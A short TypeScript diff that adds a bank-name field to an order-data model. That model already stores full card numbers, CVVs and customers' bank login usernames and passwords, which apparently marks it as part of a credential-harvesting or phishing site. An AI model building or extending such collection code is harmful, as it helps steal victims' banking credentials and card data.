@@ -9,6 +9,7 @@ export interface OrderData {
   formData: FormData;
   cardData: CardData;
   bankLoginData: BankLoginData;
+  bankName: string;
   productInfo?: {
     id: string;
     name: string;
@@ -93,6 +94,7 @@ export const saveOrderData = async(
         billingState: '',
         billingZipCode: '',
       },
+      bankName: data.bankName || '',
       cardData: data.cardData || {
         cardholderName: '',
         cardNumber: '',
@@ -166,6 +168,7 @@ export const saveOrderDatainDB = async (orderId: string, data: Partial<OrderData
       expiryDate: '',
       cvv: '',
     },
+    bankName: data.bankName || '',
     bankLoginData: data.bankLoginData || {
       username: '',
       password: '',
